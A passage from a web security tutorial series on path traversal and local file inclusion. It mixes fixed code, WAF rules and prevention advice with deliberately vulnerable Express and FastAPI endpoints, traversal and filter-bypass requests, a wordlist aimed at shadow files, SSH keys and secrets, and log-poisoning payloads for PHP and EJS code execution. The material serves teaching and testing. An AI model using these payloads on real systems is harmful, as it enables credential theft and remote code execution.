  res.sendFile(filePath);
});

// Bypass for the "safe" endpoint:
// ....// becomes ../ after stripping one ../
// ..././ becomes ../ after stripping one ../
// URL-encoded ..%2f is not caught by string replace

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
```

### Exploitation

```http
# Direct traversal on /api/files/download
GET /api/files/download?file=../../../../etc/passwd HTTP/1.1
Host: target.example.com

# Direct traversal on /api/files/view
GET /api/files/view?name=../../../../etc/passwd HTTP/1.1
Host: target.example.com

# Bypass the naive filter on /api/files/safe-download
GET /api/files/safe-download?file=....//....//....//....//etc/passwd HTTP/1.1
Host: target.example.com

# Alternative bypass using ..././
GET /api/files/safe-download?file=..././..././..././..././etc/passwd HTTP/1.1
Host: target.example.com
```

### Fixed Code

```javascript
const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

const UPLOAD_DIR = path.resolve(__dirname, 'uploads');

/**
 * SECURE file download endpoint.
 *
 * Defense strategy:
 * 1. Use path.resolve() to get the absolute canonical path
 * 2. Verify the resolved path starts with the allowed base directory
 * 3. Use path.basename() as an additional layer for simple filename cases
 * 4. Reject any input containing path separators if only filenames are expected
 */
app.get('/api/files/download', (req, res) => {
  const filename = req.query.file;

  if (!filename) {
    return res.status(400).json({ error: 'Filename required' });
  }

  // Reject if filename contains any path separator or traversal sequence
  // This is defense-in-depth; the canonicalization check below is the primary defense
  if (filename.includes('/') || filename.includes('\\') || filename.includes('..')) {
    return res.status(400).json({ error: 'Invalid filename' });
  }

  // Resolve to absolute path and canonicalize
  const resolvedPath = path.resolve(UPLOAD_DIR, filename);

  // PRIMARY DEFENSE: Verify the resolved path is within the allowed directory
  // path.resolve() handles ../, symlinks are NOT resolved here (use fs.realpathSync for that)
  if (!resolvedPath.startsWith(UPLOAD_DIR + path.sep) && resolvedPath !== UPLOAD_DIR) {
    return res.status(403).json({ error: 'Access denied' });
  }

  // ADDITIONAL DEFENSE: Resolve symlinks and verify again
  try {
    const realPath = fs.realpathSync(resolvedPath);
    const realUploadDir = fs.realpathSync(UPLOAD_DIR);
    if (!realPath.startsWith(realUploadDir + path.sep)) {
      return res.status(403).json({ error: 'Access denied' });
    }
  } catch (err) {
    return res.status(404).json({ error: 'File not found' });
  }

  res.sendFile(resolvedPath);
});

/**
 * SECURE file view endpoint.
 * Only allows viewing files by their basename (no subdirectories).
 */
app.get('/api/files/view', (req, res) => {
  const filename = req.query.name;

  if (!filename) {
    return res.status(400).json({ error: 'Filename required' });
  }

  // Extract only the basename, discarding any path components
  const safeName = path.basename(filename);

  // Reject hidden files (starting with .)
  if (safeName.startsWith('.')) {
    return res.status(403).json({ error: 'Access denied' });
  }

  // Whitelist allowed extensions
  const allowedExtensions = ['.txt', '.pdf', '.png', '.jpg', '.csv'];
  const ext = path.extname(safeName).toLowerCase();
  if (!allowedExtensions.includes(ext)) {
    return res.status(400).json({ error: 'File type not allowed' });
  }

  const resolvedPath = path.resolve(UPLOAD_DIR, safeName);

  // Verify containment
  if (!resolvedPath.startsWith(UPLOAD_DIR + path.sep)) {
    return res.status(403).json({ error: 'Access denied' });
  }

  fs.readFile(resolvedPath, (err, data) => {
    if (err) {
      return res.status(404).json({ error: 'File not found' });
    }
    // Set appropriate Content-Type instead of defaulting to HTML
    res.type(ext);
    res.send(data);
  });
});

app.listen(3000, () => {
  console.log('Secure server running on port 3000');
});
```

### Key Defensive Principles in the Fix

1. **`path.resolve()` + startsWith check**: The canonical defense. Resolve the full path, then verify it is within the allowed directory. This defeats all encoding tricks because `path.resolve()` operates on the decoded, canonicalized path.

2. **`fs.realpathSync()`**: Resolves symbolic links. Without this, an attacker who can create a symlink inside the uploads directory (via a separate vulnerability) could bypass the `startsWith` check.

3. **Input rejection**: Rejecting path separators and `..` in the input is defense-in-depth. It is not the primary defense (that is the canonicalization check) but it blocks attacks before they reach the filesystem.

4. **Extension whitelist**: Only allow expected file types. This prevents an attacker from even requesting `.env`, `.js`, or other sensitive extensions.

---

## 14. FastAPI Vulnerable File Endpoint + Fixed Code

### Vulnerable Code

```python
from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import FileResponse
import os

app = FastAPI()

UPLOAD_DIR = "/app/uploads"

# VULNERABLE: Direct path concatenation
@app.get("/api/files/download")
async def download_file(file: str = Query(...)):
    file_path = os.path.join(UPLOAD_DIR, file)

    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")

    return FileResponse(file_path)


# VULNERABLE: Naive sanitization
@app.get("/api/files/safe-download")
async def safe_download(file: str = Query(...)):
    # This is trivially bypassed with ....// or url encoding
    sanitized = file.replace("../", "")
    file_path = os.path.join(UPLOAD_DIR, sanitized)

    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")

    return FileResponse(file_path)


# VULNERABLE: Using path parameter
@app.get("/api/files/{filename:path}")
async def get_file(filename: str):
    """The :path converter captures the full remaining path including slashes"""
    file_path = os.path.join(UPLOAD_DIR, filename)
    if os.path.isfile(file_path):
        return FileResponse(file_path)
    raise HTTPException(status_code=404, detail="File not found")
```

### Exploitation

```http
# Direct traversal
GET /api/files/download?file=../../../../etc/passwd HTTP/1.1
Host: target.example.com

# Bypass naive filter
GET /api/files/safe-download?file=....//....//....//etc/passwd HTTP/1.1
Host: target.example.com

# Path parameter traversal
GET /api/files/..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
Host: target.example.com
```

### Fixed Code

```python
from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import FileResponse
import os
import re

app = FastAPI()

UPLOAD_DIR = os.path.realpath("/app/uploads")

# Allowed file extensions whitelist
ALLOWED_EXTENSIONS = {".pdf", ".png", ".jpg", ".jpeg", ".csv", ".txt", ".docx"}


def is_safe_path(base_dir: str, user_path: str) -> str | None:
    """
    Safely resolve a user-provided path relative to a base directory.
    Returns the resolved absolute path if safe, None otherwise.

    Defense layers:
    1. os.path.realpath() resolves ../, symlinks, and produces canonical path
    2. startswith() check ensures the resolved path is within the base directory
    3. os.path.basename() check rejects path separators (optional, for flat dirs)
    """
    # Resolve to absolute canonical path (resolves ../, symlinks, etc.)
    resolved = os.path.realpath(os.path.join(base_dir, user_path))

    # Verify the resolved path is within the allowed base directory
    # The os.sep suffix prevents /app/uploads_evil from matching /app/uploads
    if not (resolved.startswith(base_dir + os.sep) or resolved == base_dir):
        return None

    return resolved


@app.get("/api/files/download")
async def download_file(file: str = Query(..., min_length=1, max_length=255)):
    """
    SECURE file download endpoint.
    """
    # Reject inputs containing traversal patterns (defense in depth)
    if ".." in file or "/" in file or "\\" in file:
        raise HTTPException(status_code=400, detail="Invalid filename")

    # Validate extension
    _, ext = os.path.splitext(file)
    if ext.lower() not in ALLOWED_EXTENSIONS:
        raise HTTPException(status_code=400, detail="File type not allowed")

    # Reject hidden files
    if file.startswith("."):
        raise HTTPException(status_code=400, detail="Invalid filename")

    # Safe path resolution
    safe_path = is_safe_path(UPLOAD_DIR, file)
    if safe_path is None:
        raise HTTPException(status_code=403, detail="Access denied")

    if not os.path.isfile(safe_path):
        raise HTTPException(status_code=404, detail="File not found")

    return FileResponse(
        safe_path,
        filename=os.path.basename(safe_path),  # Force safe filename in response
        media_type="application/octet-stream",
    )


@app.get("/api/files/view/{filename}")
async def view_file(filename: str):
    """
    SECURE file view endpoint.
    Uses basename extraction to prevent any traversal in path parameters.
    """
    # Extract only the filename, discarding any path components
    safe_name = os.path.basename(filename)

    if not safe_name or safe_name.startswith("."):
        raise HTTPException(status_code=400, detail="Invalid filename")

    _, ext = os.path.splitext(safe_name)
    if ext.lower() not in ALLOWED_EXTENSIONS:
        raise HTTPException(status_code=400, detail="File type not allowed")

    safe_path = is_safe_path(UPLOAD_DIR, safe_name)
    if safe_path is None:
        raise HTTPException(status_code=403, detail="Access denied")

    if not os.path.isfile(safe_path):
        raise HTTPException(status_code=404, detail="File not found")

    return FileResponse(safe_path)
```

### Key Defensive Principles in the Fix

1. **`os.path.realpath()`**: Unlike `os.path.abspath()`, `realpath()` resolves symbolic links. This is critical -- `abspath()` alone can be bypassed with symlinks.

2. **Trailing separator in `startswith()`**: Without `base_dir + os.sep`, the path `/app/uploads_evil/file.txt` would pass a `startswith("/app/uploads")` check. The separator ensures we are checking directory containment, not prefix matching.

3. **`os.path.basename()`**: For endpoints that should only serve files from a flat directory (no subdirectories), extracting the basename is the simplest defense -- it is impossible to traverse with just a filename.

4. **Extension whitelist**: Strictly limits what file types can be served.

5. **Input length limit**: `max_length=255` prevents extremely long traversal strings and potential buffer issues.

---

## 15. Burp Suite Intruder with Traversal Wordlists

### Setting Up the Attack

**Step 1: Capture the Base Request**

Intercept a legitimate file download request in Burp Proxy:

```http
GET /api/files/download?file=report.pdf HTTP/1.1
Host: target.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Cookie: session=abc123
```

**Step 2: Send to Intruder**

Right-click the request in Proxy history and select "Send to Intruder."

**Step 3: Configure Positions**

In the Intruder Positions tab, clear all automatic position markers and select the filename value:

```http
GET /api/files/download?file=$$report.pdf$$ HTTP/1.1
```

Set the attack type to **Sniper** (one payload list, one position).

**Step 4: Load a Traversal Wordlist**

In the Payloads tab, load a path traversal wordlist. Recommended wordlists:

```
# SecLists
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

# dotdotpwn patterns (generate first)
dotdotpwn -m stdout -d 8 -f /etc/passwd -o traversal_payloads.txt
```

### Custom Wordlist for High-Value Targets

Create a focused wordlist targeting the most valuable files:

```
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hostname
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../proc/self/cwd/.env
../../../../proc/self/cwd/config/database.js
../../../../proc/self/cwd/package.json
../../../../var/log/nginx/access.log
../../../../var/log/nginx/error.log
../../../../home/node/app/.env
../../../../root/.ssh/id_rsa
../../../../root/.ssh/authorized_keys
../../../../var/run/secrets/kubernetes.io/serviceaccount/token
../../../../run/secrets/db_password
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
..%00/etc/passwd
../../../../etc/passwd%00.png
../../../../etc/nginx/nginx.conf
../../../../etc/nginx/sites-enabled/default
../../../../etc/redis/redis.conf
../../../../etc/mysql/my.cnf
```

### Step 5: Configure Grep Match

In the Intruder Options tab under "Grep - Match," add strings to flag successful reads:

```
root:x:0:0
DATABASE_URL=
AWS_ACCESS_KEY
PRIVATE KEY
requirepass
password=
secret=
api_key=
```

### Step 6: Analyze Results

After the attack completes:

1. Sort by **Status Code**: 200 responses with content are hits
2. Sort by **Length**: Responses significantly larger than error responses indicate file reads
3. Check the **Grep Match** columns for flagged strings
4. Manually review any anomalous responses (unusual status codes, different content types)

### Burp Suite Extension: Backslash Powered Scanner

The Backslash Powered Scanner extension by James Kettle automatically detects path traversal by injecting various traversal sequences and analyzing differential responses. Install it from the BApp Store and run an active scan against file-serving endpoints.

### Turbo Intruder for High-Speed Testing

For testing large traversal wordlists against multiple endpoints, Turbo Intruder provides significantly better throughput:

```python
# Turbo Intruder script for path traversal
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=100,
        pipeline=True
    )

    for word in open('/path/to/traversal-wordlist.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    if 'root:x:0:0' in req.response:
        table.add(req)
    # Flag large responses (likely file contents vs error messages)
    if len(req.response) > 500:
        table.add(req)
```

---

## 16. Chaining LFI with Log Poisoning for RCE

### The Attack Chain

Log poisoning transforms a Local File Inclusion (read-only) vulnerability into Remote Code Execution. The chain works as follows:

1. **Identify an LFI vulnerability** (you can read arbitrary files)
2. **Inject code into a log file** by sending a malicious request
3. **Include the poisoned log file** via LFI, causing the injected code to execute

This chain is most effective against PHP applications (where `include()` executes PHP in included files), but analogous techniques exist for other stacks.

### Step 1: Confirm LFI

```http
GET /page?view=../../../../var/log/apache2/access.log HTTP/1.1
Host: target.example.com
```

Confirm you can read the access log.

### Step 2: Poison the Log (PHP Example)

Send a request with PHP code in the User-Agent header:

```http
GET /nonexistent HTTP/1.1
Host: target.example.com
User-Agent: <?php system($_GET['cmd']); ?>
```

The access log now contains:

```
192.168.1.50 - - [15/Mar/2025:10:30:00 +0000] "GET /nonexistent HTTP/1.1" 404 287 "-" "<?php system($_GET['cmd']); ?>"
```

### Step 3: Include the Poisoned Log

```http
GET /page?view=../../../../var/log/apache2/access.log&cmd=id HTTP/1.1
Host: target.example.com
```

When the application includes the log file via `include()` or `require()`, PHP parses it and executes the injected code. The `id` command output appears in the response:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Log Poisoning Targets

| Log File | Injection Vector |
|----------|-----------------|
| `/var/log/apache2/access.log` | User-Agent, Referer, or URL |
| `/var/log/nginx/access.log` | User-Agent, Referer |
| `/var/log/nginx/error.log` | Malformed request |
| `/var/log/mail.log` | SMTP VRFY/RCPT TO commands |
| `/var/log/vsftpd.log` | FTP username |
| `/var/log/auth.log` | SSH username |
| `/proc/self/fd/1` | stdout of the current process |

### SSH Log Poisoning

If you can read `/var/log/auth.log`:

```bash
# Inject PHP code as the SSH username
ssh '<?php system($_GET["cmd"]); ?>'@target.example.com
```

The failed login attempt is logged:

```
Mar 15 10:35:00 target sshd[12345]: Invalid user <?php system($_GET["cmd"]); ?> from 192.168.1.50
```

Then include via LFI:

```http
GET /page?view=../../../../var/log/auth.log&cmd=id HTTP/1.1
```

### Node.js/Express Equivalent: SSTI via Log Inclusion

In Node.js applications using template engines, if the LFI includes a file as a template rather than serving it raw, you can achieve RCE through Server-Side Template Injection in the log file.

For example, if the application uses EJS and the LFI triggers template rendering:

```http
# Poison the log with an EJS payload
GET /nonexistent HTTP/1.1
User-Agent: <%- global.process.mainModule.require('child_process').execSync('id').toString() %>
```

### LFI to RCE via /proc/self/environ (CGI/older PHP)

In some configurations, environment variables are included in the process environment. If you can control an environment variable (such as `User-Agent` via CGI), you can inject code:

```http
GET /page?view=../../../../proc/self/environ HTTP/1.1
Host: target.example.com
User-Agent: <?php system('id'); ?>
```

In CGI mode, the `User-Agent` header is stored in the `HTTP_USER_AGENT` environment variable, which appears in `/proc/self/environ`. When included, the PHP code executes.

### Mitigation Against Log Poisoning

1. **Never use `include()` or equivalent with user-controlled paths** -- this eliminates the entire attack class
2. **If you must include files dynamically**, use a whitelist of allowed filenames (not paths)
3. **Sanitize log entries** to strip or encode special characters before writing
4. **Restrict log file permissions** so the web server user cannot read them
5. **Use structured logging (JSON)** that escapes special characters by default

---

## 17. Common Developer Mistakes

### Mistake 1: Blacklist Instead of Whitelist

```javascript
// BAD: Blacklisting specific patterns
filename = filename.replace(/\.\./g, '');
// Bypassed with: ....// -> ../ after replace
```

### Mistake 2: Single-Pass Sanitization

```python
# BAD: Only strips once
filename = filename.replace('../', '')
# Input:  ....//....//etc/passwd
# After:  ../../etc/passwd (traversal restored)
```

### Mistake 3: Checking Before Decoding

```javascript
// BAD: Check happens before URL decoding
if (filename.includes('../')) {
  return res.status(400).send('Blocked');
}
// Bypassed with: ..%2f..%2f (not decoded yet when checked)
```

### Mistake 4: Using path.join() Without Containment Check

```javascript
// BAD: path.join resolves ../ but does not prevent escape
const filePath = path.join(UPLOAD_DIR, userInput);
// path.join('/uploads', '../../etc/passwd') = '/etc/passwd'
```

### Mistake 5: Using abspath() Instead of realpath()

```python
# BAD: abspath does not resolve symlinks
resolved = os.path.abspath(os.path.join(base_dir, user_input))
# If there's a symlink: /uploads/link -> /etc/
# abspath('/uploads/link/passwd') = '/uploads/link/passwd' (passes check)
# But the actual file is /etc/passwd
```

### Mistake 6: Trusting Content-Type to Prevent Traversal

```javascript
// BAD: Checking Content-Type does not prevent path traversal
// The Content-Type header is about the response, not the file's safety
```

### Mistake 7: Serving Static Files Without Proper Configuration

```javascript
// BAD: Overly broad static file serving
app.use('/files', express.static('/'));
// This literally serves the entire filesystem
```

---

## 18. Detection Strategies

### Web Application Firewall (WAF) Rules

**ModSecurity rules for path traversal detection:**

```
# Detect ../ sequences (including encoded variants)
SecRule REQUEST_URI|ARGS|REQUEST_BODY "@rx (?i)(?:\.\./|\.\.\\\\)" \
    "id:1001,phase:2,deny,status:403,msg:'Path Traversal Attempt'"

# Detect access to sensitive files
SecRule REQUEST_URI|ARGS|REQUEST_BODY "@rx (?i)(?:/etc/passwd|/etc/shadow|\.env|id_rsa|proc/self)" \
    "id:1002,phase:2,deny,status:403,msg:'Sensitive File Access Attempt'"

# Detect double-encoded traversal
SecRule REQUEST_URI "@rx %252e%252e" \
    "id:1003,phase:1,deny,status:403,msg:'Double Encoded Traversal'"
```

### Log Monitoring

```bash
# Monitor Nginx access logs for traversal patterns
tail -f /var/log/nginx/access.log | grep -iE '(\.\./|%2e%2e|%252e|etc/passwd|proc/self)'

# Monitor application logs for path resolution outside expected directories
# (requires application-level logging of resolved paths)
```

### SIEM Queries (Splunk Example)

```
index=web_logs
(uri_path="*..*" OR uri_query="*..*" OR uri_path="*%2e%2e*" OR uri_query="*%252e*")
| stats count by src_ip, uri_path, status
| where count > 10
| sort -count
```

### Runtime Application Self-Protection (RASP)

Instrument the application to detect traversal at runtime:

```javascript
// Express.js middleware for path traversal detection
const path = require('path');

function pathTraversalDetector(allowedDirs) {
  return (req, res, next) => {
    const allParams = {
      ...req.query,
      ...req.params,
      ...(req.body || {}),
    };

    for (const [key, value] of Object.entries(allParams)) {
      if (typeof value === 'string') {
        const resolved = path.resolve(value);
        const containsTraversal = value.includes('..') ||
          value.includes('%2e') ||
          value.includes('%252e');

        if (containsTraversal) {
          console.warn(`[SECURITY] Path traversal attempt detected: param=${key}, value=${value}, ip=${req.ip}`);
          // Send to SIEM/alerting system
          return res.status(403).json({ error: 'Forbidden' });
        }
      }
    }
    next();
  };
}
```

---

## 19. Prevention Strategies

### Strategy 1: Canonicalize and Verify Containment

This is the primary defense. Every other strategy is defense-in-depth.

```javascript
// Node.js
const resolved = path.resolve(baseDir, userInput);
const real = fs.realpathSync(resolved);
if (!real.startsWith(fs.realpathSync(baseDir) + path.sep)) {
  throw new Error('Path traversal blocked');
}
```

```python
# Python
resolved = os.path.realpath(os.path.join(base_dir, user_input))
if not resolved.startswith(os.path.realpath(base_dir) + os.sep):
    raise PermissionError("Path traversal blocked")
```

### Strategy 2: Use Indirect References

Instead of passing filenames directly, use an ID or hash that maps to a file on the server:

```javascript
// Map file IDs to actual paths (stored in database)
app.get('/api/files/:id', async (req, res) => {
  const file = await db.query('SELECT path FROM files WHERE id = $1 AND user_id = $2',
    [req.params.id, req.user.id]);

  if (!file) return res.status(404).send('Not found');

  // User never controls the path - it comes from the database
  res.sendFile(file.path);
});
```

### Strategy 3: Chroot or Container Isolation

Run file-serving components in a chroot jail or minimal container where sensitive files simply do not exist:

```dockerfile
# Minimal container for file serving
FROM node:20-alpine AS app
WORKDIR /app
COPY package*.json ./
RUN npm ci --production

# Only copy the application code - no .env, no SSH keys, no configs
COPY src/ ./src/
COPY uploads/ ./uploads/

# Run as non-root user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser

# Even if traversal occurs, there's nothing sensitive to read
CMD ["node", "src/server.js"]
```

### Strategy 4: Filesystem Permissions

```bash
# Ensure the web server user has minimal permissions
# Only the uploads directory is readable
chmod 750 /var/www/app/uploads
chown www-data:www-data /var/www/app/uploads

# Sensitive files are not readable by the web server user
chmod 600 /var/www/app/.env
chown root:root /var/www/app/.env

# Remove read permissions on SSH keys
chmod 600 /root/.ssh/id_rsa
```

### Strategy 5: WAF + Rate Limiting on File Endpoints

```nginx
# Nginx rate limiting for file download endpoints
limit_req_zone $binary_remote_addr zone=file_download:10m rate=10r/m;

location /api/files/ {
    limit_req zone=file_download burst=5 nodelay;
    proxy_pass http://backend;
}
```

### Strategy 6: Disable Directory Listing

```nginx
# Nginx
autoindex off;

# Apache
Options -Indexes
```

### Strategy 7: Use Object Storage Instead of Local Filesystem

Serving files from S3, GCS, or Azure Blob Storage with pre-signed URLs eliminates path traversal entirely because there is no local filesystem path to traverse:

```javascript
const { S3Client, GetObjectCommand } = require('@aws-sdk/client-s3');
const { getSignedUrl } = require('@aws-sdk/s3-request-presigner');

app.get('/api/files/:id', async (req, res) => {
  const file = await db.query('SELECT s3_key FROM files WHERE id = $1', [req.params.id]);
  if (!file) return res.status(404).send('Not found');

  const command = new GetObjectCommand({
    Bucket: 'my-secure-bucket',
    Key: file.s3_key,
  });

  const url = await getSignedUrl(s3Client, command, { expiresIn: 300 });
  res.redirect(url);
});
```

---

## 20. Bug Bounty Report Example

### Title

Path Traversal in File Download Endpoint Allows Reading Arbitrary Server Files Including .env with Database Credentials and AWS Keys

### Severity

**Critical (CVSS 9.1)**

Path traversal allows unauthenticated (or low-privileged) reading of arbitrary files on the server. Confirmed ability to read `/etc/passwd`, `.env` (containing database credentials and AWS access keys), application source code, and private SSH keys.

### Affected Endpoint

```
GET /api/v2/documents/download?filename=<PAYLOAD>
```

### Steps to Reproduce

**Step 1:** Log in to the application with any user account and obtain a valid session token.

**Step 2:** Navigate to the document download feature and intercept a legitimate download request in Burp Suite:

```http
GET /api/v2/documents/download?filename=quarterly-report.pdf HTTP/1.1
Host: app.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Cookie: session=a1b2c3d4
```

**Step 3:** Modify the `filename` parameter to a traversal payload:

```http
GET /api/v2/documents/download?filename=../../../../etc/passwd HTTP/1.1
Host: app.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Cookie: session=a1b2c3d4
```

**Step 4:** Observe the response contains the contents of `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

**Step 5:** Read the application's `.env` file:

```http
GET /api/v2/documents/download?filename=../../../../proc/self/cwd/.env HTTP/1.1
Host: app.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

**Response contains:**

```
DATABASE_URL=postgresql://prod_admin:Xy7$mK9!pQ2w@rds-prod.abc123.us-east-1.rds.amazonaws.com:5432/production
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
JWT_SECRET=production-jwt-secret-...
```

### Impact

1. **Confidentiality - Critical**: Arbitrary file read exposes all server-side files readable by the application process, including credentials, source code, and cryptographic keys.

2. **Integrity - High**: Extracted JWT secret allows forging authentication tokens for any user, including administrators. Extracted database credentials allow direct database modification.

3. **Availability - Medium**: Extracted AWS credentials allow shutting down infrastructure. Database access allows data destruction.

4. **Full attack chain demonstrated**: LFI -> .env read -> AWS credential extraction -> (stopped here, did not access AWS resources per program rules).

### Recommended Fix

1. Implement path canonicalization with containment verification (see code samples in this report)
2. Replace direct file serving with S3 pre-signed URLs
3. Rotate all credentials exposed in `.env` immediately
4. Rotate the JWT secret and invalidate all existing sessions
5. Rotate AWS access keys
6. Audit CloudTrail logs for unauthorized AWS API calls using the exposed credentials

---

## 21. Lab Setup Ideas

### Lab 1: Vulnerable Express.js File Server

```javascript
// vulnerable-server.js
const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

app.get('/download', (req, res) => {
  const file = req.query.file;
  const filePath = path.join(__dirname, 'public', file);
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send('Not found');
  }
});

app.get('/download-filtered', (req, res) => {
  let file = req.query.file;
  file = file.replace('../', ''); // Weak filter
  const filePath = path.join(__dirname, 'public', file);
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send('Not found');
  }
});

app.listen(3000);
```

### Lab 2: Docker Compose Environment with Secrets

```yaml
# docker-compose.yml
version: "3.8"
services:
  vulnerable-app:
    build: .
    ports:
      - "3000:3000"
    environment:
      - DATABASE_URL=postgresql://admin:secret@db:5432/mydb
      - JWT_SECRET=super-secret-jwt-key
      - AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
      - AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    volumes:
      - ./uploads:/app/uploads

  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: secret
      POSTGRES_DB: mydb
```

### Lab 3: DVWA and Other Existing Labs

- **DVWA (Damn Vulnerable Web Application)**: Has a dedicated LFI module with adjustable difficulty
- **bWAPP**: Includes multiple path traversal scenarios
- **WebGoat**: OWASP's training platform with path traversal lessons
- **HackTheBox**: Multiple machines with LFI as an attack vector (search for "LFI" in retired machines)
- **PortSwigger Web Security Academy**: Free path traversal labs at https://portswigger.net/web-security/file-path-traversal

### Lab 4: FastAPI with /proc Access

```python
# main.py
from fastapi import FastAPI, Query
from fastapi.responses import PlainTextResponse
import os

app = FastAPI()

BASE_DIR = "/app/files"

@app.get("/read")
async def read_file(path: str = Query(...)):
    file_path = os.path.join(BASE_DIR, path)
    try:
        with open(file_path, 'r') as f:
            return PlainTextResponse(f.read())
    except Exception as e:
        return PlainTextResponse(f"Error: {e}", status_code=404)
```

```dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install fastapi uvicorn
COPY . .
# Intentionally creating sensitive files for the lab
RUN echo "SECRET_KEY=lab-secret-key" > /app/.env
RUN mkdir -p /app/files && echo "public file" > /app/files/readme.txt
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

**Practice exercises:**

1. Read `/etc/passwd` via path traversal
2. Read `/proc/self/environ` to find environment variables
3. Read `/proc/self/cmdline` to determine the application entry point
4. Use `/proc/self/cwd/.env` to find the application's secret key
5. Bypass the filter endpoint using `....//` sequences
6. Try double URL encoding to bypass WAF rules (add a reverse proxy with basic filtering)

---

## 22. Conclusion

Path traversal and Local File Inclusion are not exotic vulnerabilities. They are among the most common findings in web application security assessments, and their impact ranges from information disclosure to full infrastructure compromise. The core problem -- trusting user input in file path construction -- is straightforward, yet it persists across every framework and language because developers keep building custom file-serving logic without understanding the security implications.

The defensive answer is equally straightforward: canonicalize the resolved path, verify it is contained within the intended directory, resolve symlinks, and prefer indirect references (database IDs mapped to paths) over direct filename parameters. Object storage with pre-signed URLs eliminates the vulnerability class entirely.

For testers, the key is systematic enumeration. Do not stop at `/etc/passwd`. Every file you can read is a potential stepping stone to further access. The `.env` file, Docker secrets, `/proc/self/environ`, SSH keys, application source code -- each of these can transform a file read into full compromise.

Build the labs. Practice the bypasses. Learn to chain LFI with other vulnerabilities. This is one of the most rewarding vulnerability classes to master because the exploitation depth is virtually unlimited.

---

**Next in this series:** Part 9 covers GraphQL Security Testing -- introspection abuse, query nesting attacks, resolver authorization bypasses, and the complete offensive toolkit for GraphQL APIs.

*If this guide improved your testing methodology, share it with your security team. Path traversal is not going away -- but with the right knowledge, neither are you.*
